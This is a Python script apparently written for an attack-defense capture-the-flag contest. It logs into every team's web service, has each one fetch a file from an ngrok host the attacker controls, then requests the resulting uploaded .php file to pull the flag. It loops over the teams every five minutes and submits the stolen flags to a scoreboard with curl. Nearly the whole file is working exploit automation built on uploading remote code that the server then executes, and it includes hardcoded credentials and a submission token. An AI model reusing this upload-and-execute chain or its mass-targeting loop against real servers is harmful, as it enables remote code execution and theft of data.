import requests
import os
import json
from time import sleep


sess = requests.Session()

username = 'a123323' # os.urandom(8).encode('hex')
password = 'b08402843' # os.urandom(16).encode('hex')

def login(host):
    sess.post(host + '/login', data={'username': username, 'password': password})

def upload(host, url):
    res = sess.post(host + '/upload', data={'url': url}, allow_redirects=False)
    location = res.headers['Location']
    id = (location[-8:])
    return id

def get_flag(host, id):
    res = sess.get(host + '/uploads/' + id + '.php')
    return res.text

def attack(teamid):
    host = f'http://10.9.{teamid}.1'
    url = 'https://3c8b-140-113-92-193.jp.ngrok.io'
    login(host)
    id = upload(host, url)
    flag = get_flag(host, id)
    return flag

def main ():
    flags = []
    for teamid in range(1, 26):
    # for teamid in range(1, 3):
        if teamid == 22:
            continue
        try:
            flag = attack(teamid)
            # print(flag)
            flags.append(flag)
        except Exception as e:
            print(teamid, e)
    obj = {
        "flags": flags,
        "token": "786fb0334cc340b39d291b44d892e71d"
    }
    cmd = f'''
curl 'http://10.6.0.1:8889/flag' \
  -H 'content-type: application/json' \
  --data-raw '{json.dumps(obj)}' '''
    os.system(cmd)
    print()
    print(','.join(flags))

if __name__ == '__main__':
    while True:
        main()
        sleep(300)